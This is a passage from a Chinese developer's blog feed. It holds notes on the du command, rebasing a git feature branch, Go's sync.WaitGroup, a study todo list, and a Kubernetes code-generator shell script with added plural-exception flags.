Alt+q（20230717）</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717195333.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717195441.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202303) 常用命令：du</title>
    <link href="/2023/03/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202303)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Adu/"/>
    <url>/2023/03/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202303)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Adu/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">-s, --summarize<br>       display only a total <span class="hljs-keyword">for</span> each argument<br>-h, --human-readable<br>       <span class="hljs-built_in">print</span> sizes <span class="hljs-keyword">in</span> human readable format (e.g., 1K 234M 2G)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 计算当前文件夹的总磁盘占用量</span><br><span class="hljs-comment"># -s选项表示计算总和, -h选项表示以恰当的K/M/G单位展示</span><br>[root@ningan ~]<span class="hljs-comment"># du -sh</span><br>13G     .<br>[root@ningan ~]<span class="hljs-comment"># du -sh .</span><br>13G     .<br><br><br><br><span class="hljs-comment"># 展示每一个参数对应的磁盘空间使用量</span><br><span class="hljs-comment"># 通配形式的参数首先被Shell解析, 然后-s选项发挥作用, 展示每一个参数对应的磁盘空间使用量</span><br>[root@ningan ~]<span class="hljs-comment"># du -sh *</span><br>564M    bcc<br>31M     bpftrace<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【git】git graph</title>
    <link href="/2023/03/23/git/%E3%80%90git%E3%80%91git%20graph/"/>
    <url>/2023/03/23/git/%E3%80%90git%E3%80%91git%20graph/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>有两个分支：master和feature分支，我在feature分支上开发，发现master上面提交了新的内容，我想把master上新的内容也放到我的feature分支上，基于这些新的内容来开发feature分支</p><p>本来想用vscode中的git graph插件，快速解决该问题。但是vscode装不上git graph插件，当时为了解决问题，只好先通过命令行的方式来搞。</p><p>以下为命令行的方式解决的该问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">git checkout master<br>git pull<br>git checkout feature_iaasnodescontroller<br>git rebase master<br>在这个feature_iaasnodescontroller的分支执行git <span class="hljs-built_in">log</span> 就能看到master上面前面做的提交了<br><span class="hljs-comment"># 强制把本地分支同步到远程分支</span><br>git push origin feature_iaasnodescontroller --force<br><br><br><span class="hljs-comment"># 其他相关命令</span><br> git <span class="hljs-built_in">log</span> --all --pretty=oneline --abbrev-commit --graph<br> git <span class="hljs-built_in">log</span> --oneline<br> git <span class="hljs-built_in">log</span> --oneline --graph<br></code></pre></td></tr></table></figure><p>后来发现vscode装不上插件是因为开了代理，把代理关了就可以装上插件了</p><h2 id="git-graph"><a href="#git-graph" class="headerlink" title="git graph"></a>git graph</h2><p>HEAD是一个特殊的指针，指向当前所在的本地分支。<br>当我们执行<code>git checkout testing</code>切换到testing分支时，HEAD就会指向testing。</p><p>Graph图中的点就是一个提交对象或者叫一次提交记录。</p><p>建一个新的 git 项目，然后把你知道的所有操作都来上一遍，一边做一边看这个图怎么变的。搞一次就懂，终身难忘。</p><p>自己建一个repo，多搞几个branch，修改之后就来回来去merge、rebase一下，玩儿一个周末就懂了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://segmentfault.com/q/1010000007376119">如何看懂git的 graph图？</a></p>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【go语言系列】sync.WaitGroup</title>
    <link href="/2023/03/21/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91sync.WaitGroup/"/>
    <url>/2023/03/21/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91sync.WaitGroup/</url>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>官方文档对 WaitGroup 的描述是：<code>一个 WaitGroup 对象可以等待一组协程结束</code>。使用方法是：</p><ol><li>main 协程通过调用 <code>wg.Add(delta int)</code> 设置 worker 协程的个数，然后创建 worker 协程；</li><li>worker 协程执行结束以后，都要调用 <code>wg.Done()</code>；</li><li>main 协程调用 <code>wg.Wait()</code> 且被 block，直到所有 worker 协程全部执行结束后返回。</li></ol><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>举一个例子来说明这个问题</p><p>下面三个小demo可以实现同样的功能，但是下一个都比上一个更加的优雅</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-comment">// // 方法1</span><br><span class="hljs-comment">// func main() &#123;</span><br><span class="hljs-comment">// for i := 0; i &lt; 100; i++ &#123;</span><br><span class="hljs-comment">// go fmt.Println(i)</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// time.Sleep(time.Second)</span><br><span class="hljs-comment">// &#125;</span><br><br><br><br><span class="hljs-comment">// // 方法2</span><br><span class="hljs-comment">// func main() &#123;</span><br><span class="hljs-comment">// num := 100</span><br><span class="hljs-comment">// c := make(chan bool, num)</span><br><span class="hljs-comment">// for i := 0; i &lt; num; i++ &#123;</span><br><span class="hljs-comment">// go func(i int) &#123;</span><br><span class="hljs-comment">// fmt.Println(i)</span><br><span class="hljs-comment">// c &lt;- true</span><br><span class="hljs-comment">// &#125;(i)</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// for i := 0; i &lt; num; i++ &#123;</span><br><span class="hljs-comment">// &lt;-c</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// &#125;</span><br><br><br><br><br><span class="hljs-comment">// 方法3</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>wg := sync.WaitGroup&#123;&#125;<br>num := <span class="hljs-number">10</span><br>wg.Add(num)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; num; i++ &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-comment">// wg.Done() // 位置1  放这会有问题  如果要放在这，需要写成defer wg.Done()</span><br>fmt.Println(i)<br>wg.Done() <span class="hljs-comment">// 位置2</span><br>&#125;(i)<br>&#125;<br>wg.Wait()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于方法3来说，wg.Done()要放在写成结束之后，否则就会有问题</p><p>当wg.Done()放在位置1处，如下为两次运行代码的结果。可以看到，很可能在协程还没有开始运行，主进程就结束了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">############## wg.Done()放在位置1处 ##############</span><br><span class="hljs-comment"># go run main.go</span><br>9<br>2<br>0<br><span class="hljs-comment"># go run main.go</span><br>9<br>0<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br><br></code></pre></td></tr></table></figure><p>wg.Done()放在位置2处就没有问题了，每次当协程运行结束之后才将waitGroup中的协程减1，就不会有影响了~</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://studygolang.com/articles/12972"># Golang sync.WaitGroup的用法</a><br><a href="https://www.ququ123.top/2022/04/golang_wait_group_principle/">sync.WaitGroup 详解</a></p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>todolist</title>
    <link href="/2023/03/03/TODO/todolist/"/>
    <url>/2023/03/03/TODO/todolist/</url>
    
    <content type="html"><![CDATA[<p>【工作亟待学习】<br>【ebpf】</p><ul><li><input disabled="" type="checkbox"> 利用 ebpf sockmap&#x2F;redirection 提升 socket 性能（2020） <a href="https://cloud.tencent.com/developer/article/1793155">https://cloud.tencent.com/developer/article/1793155</a></li><li><input disabled="" type="checkbox"> 图解eBPF socket level 重定向的内核实现细节   <a href="https://cloud.tencent.com/developer/article/2245006">https://cloud.tencent.com/developer/article/2245006</a>  </li><li><input disabled="" type="checkbox"> 图解Linux网络包接收过程   <a href="https://zhuanlan.zhihu.com/p/256428917">https://zhuanlan.zhihu.com/p/256428917</a></li><li><input disabled="" type="checkbox"> 内功修炼   <a href="https://github.com/yanfeizhang/coder-kung-fu">https://github.com/yanfeizhang/coder-kung-fu</a></li><li><input disabled="" type="checkbox"> ebpf  github handbook</li><li><input disabled="" type="checkbox"> ebpf 《ebpf之巅》 第10章 网络<br>【工具类】</li><li><input disabled="" type="checkbox"> ob的excalidraw</li></ul><p>【技术类】</p><ul><li><input disabled="" type="checkbox"> 编译dlv x86和arm</li><li><input disabled="" type="checkbox"> 普罗米修斯 exporter</li><li><input disabled="" type="checkbox"> code-generator</li><li><input disabled="" type="checkbox"> kubectl alias 命令自动补全</li><li><input disabled="" type="checkbox"> go 阻塞 非阻塞</li><li><input disabled="" type="checkbox"> vscode中git的快捷使用</li><li><input disabled="" type="checkbox"> containerd 配置文件</li></ul><p>【书籍类】</p><ul><li><input disabled="" type="checkbox"> go并发</li><li><input disabled="" type="checkbox"> linux内核观测技术</li></ul><p>【课程类】</p><ul><li><input disabled="" type="checkbox"> 极客时间 ebpf课程  </li><li><input disabled="" type="checkbox"> 极客时间 linux源码课程  </li><li><input disabled="" type="checkbox"> b站 内核跟踪</li></ul><p>【工具类】</p><ul><li><input disabled="" type="checkbox"> beyondcompare 过期</li><li><input disabled="" type="checkbox"> secureCRT 老是退出</li></ul><p>【实践类】</p><ul><li><input disabled="" type="checkbox"> n2 ebpf实践</li></ul><p>【证书类】</p><ul><li><input checked="" disabled="" type="checkbox"> cka</li><li><input disabled="" type="checkbox"> cks</li><li><input disabled="" type="checkbox"> 软考-网工</li></ul><h2 id="表情包"><a href="#表情包" class="headerlink" title="表情包"></a>表情包</h2><p>语法: <code>&amp;#xCODE;</code></p><p>CODE 可以参考<a href="https://apps.timwhitlock.info/emoji/tables/unicode#block-6c-other-additional-symbols">Emoji Unicode Tables</a></p><p>例:</p><ul><li><code>U+1F60D -&gt; &amp;#x1F60D;</code> &#x3D; 😍</li><li><code>U+2705 -&gt; &amp;#x2705;</code> &#x3D; ✅</li><li><code>U+2764 -&gt; &amp;#x2764;</code> &#x3D; ❤</li><li><code>U+24C2 -&gt; &amp;#x24C2;</code> &#x3D; Ⓜ</li><li><code>U+1F1E8 U+1F1F3 -&gt; &amp;#x1F1E8; &amp;#x1F1F3; / &amp;#x1F1E8;&amp;#x1F1F3;</code> &#x3D; 🇨 🇳 &#x2F; 🇨🇳</li><li><code>U+231B -&gt; &amp;#x231B;</code> &#x3D; ⌛</li><li><code>U+1F30F -&gt; &amp;#x1F30F;</code> &#x3D; 🌏</li><li><code>U+1F34E -&gt; &amp;#x1F34E;</code> &#x3D; 🍎</li><li><code>U+1F34F -&gt; &amp;#x1F34F;</code> &#x3D; 🍏</li><li><code>U+1F422 -&gt; &amp;#x1F422;</code> &#x3D; 🐢</li><li><code>U+1F634 -&gt; &amp;#x1F634;</code> &#x3D; 😴</li></ul>]]></content>
    
    
    <categories>
      
      <category>TODO</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】code-generator</title>
    <link href="/2023/03/02/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91code-generator/"/>
    <url>/2023/03/02/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91code-generator/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230303100520.png" alt="image.png"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>code-generator是用来干什么的？有什么功能？</li><li></li></ol><h2 id="待解决"><a href="#待解决" class="headerlink" title="待解决"></a>待解决</h2><p>..&#x2F;vendor&#x2F;k8s.io&#x2F;code-generator&#x2F;generate-groups.sh</p><p>code-generator项目下的generate-groups.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env bash</span><br><br><span class="hljs-comment"># Copyright 2017 The Kubernetes Authors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="hljs-comment"># you may not use this file except in compliance with the License.</span><br><span class="hljs-comment"># You may obtain a copy of the License at</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment"># See the License for the specific language governing permissions and</span><br><span class="hljs-comment"># limitations under the License.</span><br><br><span class="hljs-built_in">set</span> -o errexit<br><span class="hljs-built_in">set</span> -o nounset<br><span class="hljs-built_in">set</span> -o pipefail<br><br><span class="hljs-comment"># generate-groups generates everything for a project with external types only, e.g. a project based</span><br><span class="hljs-comment"># on CustomResourceDefinitions.</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -lt 4 ] || [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span> == <span class="hljs-string">&quot;--help&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">Usage: $(basename &quot;$0&quot;) &lt;generators&gt; &lt;output-package&gt; &lt;apis-package&gt; &lt;groups-versions&gt; ...</span><br><span class="hljs-string"></span><br><span class="hljs-string">  &lt;generators&gt;        the generators comma separated to run (deepcopy,defaulter,client,lister,informer) or &quot;all&quot;.</span><br><span class="hljs-string">  &lt;output-package&gt;    the output package name (e.g. github.com/example/project/pkg/generated).</span><br><span class="hljs-string">  &lt;apis-package&gt;      the external types dir (e.g. github.com/example/api or github.com/example/project/pkg/apis).</span><br><span class="hljs-string">  &lt;groups-versions&gt;   the groups and their versions in the format &quot;groupA:v1,v2 groupB:v1 groupC:v2&quot;, relative</span><br><span class="hljs-string">                      to &lt;api-package&gt;.</span><br><span class="hljs-string">  ...                 arbitrary flags passed to all generator binaries.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Examples:</span><br><span class="hljs-string">  $(basename &quot;$0&quot;) all             github.com/example/project/pkg/client github.com/example/project/pkg/apis &quot;foo:v1 bar:v1alpha1,v1beta1&quot;</span><br><span class="hljs-string">  $(basename &quot;$0&quot;) deepcopy,client github.com/example/project/pkg/client github.com/example/project/pkg/apis &quot;foo:v1 bar:v1alpha1,v1beta1&quot;</span><br><span class="hljs-string">EOF</span><br>  <span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><br>GENS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>OUTPUT_PKG=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>APIS_PKG=<span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span><br>GROUPS_WITH_VERSIONS=<span class="hljs-string">&quot;<span class="hljs-variable">$4</span>&quot;</span><br><span class="hljs-built_in">shift</span> 4<br><br>(<br>  <span class="hljs-comment"># To support running this script from anywhere, first cd into this directory,</span><br>  <span class="hljs-comment"># and then install with forced module mode on and fully qualified name.</span><br>  <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;0&#125;</span>&quot;</span>)</span>&quot;</span><br>  GO111MODULE=on go install k8s.io/code-generator/cmd/&#123;defaulter-gen,client-gen,lister-gen,informer-gen,deepcopy-gen&#125;<br>)<br><span class="hljs-comment"># Go installs the above commands to get installed in $GOBIN if defined, and $GOPATH/bin otherwise:</span><br>GOBIN=<span class="hljs-string">&quot;<span class="hljs-subst">$(go env GOBIN)</span>&quot;</span><br>gobin=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GOBIN:-$(go env GOPATH)/bin&#125;</span>&quot;</span><br><br><span class="hljs-keyword">function</span> codegen::<span class="hljs-function"><span class="hljs-title">join</span></span>() &#123; <span class="hljs-built_in">local</span> IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>; <span class="hljs-built_in">shift</span>; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;$*&quot;</span>; &#125;<br><br><span class="hljs-comment"># enumerate group versions</span><br>FQ_APIS=() <span class="hljs-comment"># e.g. k8s.io/api/apps/v1</span><br><span class="hljs-keyword">for</span> GVs <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span>; <span class="hljs-keyword">do</span><br>  IFS=: <span class="hljs-built_in">read</span> -r G Vs &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GVs&#125;</span>&quot;</span><br><br>  <span class="hljs-comment"># enumerate versions</span><br>  <span class="hljs-keyword">for</span> V <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;Vs//,/ &#125;</span>; <span class="hljs-keyword">do</span><br>    FQ_APIS+=(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;APIS_PKG&#125;</span>/<span class="hljs-variable">$&#123;G&#125;</span>/<span class="hljs-variable">$&#123;V&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;deepcopy&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating deepcopy funcs&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/deepcopy-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      -O zz_generated.deepcopy \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;client&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating clientset for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/client-gen&quot;</span> \<br>      --clientset-name <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CLIENTSET_NAME_VERSIONED:-versioned&#125;</span>&quot;</span> \<br>      --input-base <span class="hljs-string">&quot;&quot;</span> \<br>      --input <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;lister&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating listers for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/lister-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;informer&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating informers for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/informers&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/informer-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --versioned-clientset-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_NAME_VERSIONED:-versioned&#125;</span>&quot;</span> \<br>      --listers-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/informers&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br>      <span class="hljs-comment"># --plural-exceptions [&quot;Endpoint:Endpointes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions [Endpointes:Endpointes] \</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfoes:ProductInstanceVpcInfoes] \</span><br>      <span class="hljs-comment"># --plural-exceptions ProductInstanceVpcInfoes:ProductInstanceVpcInfoes \</span><br>      <span class="hljs-comment"># --plural-exceptions 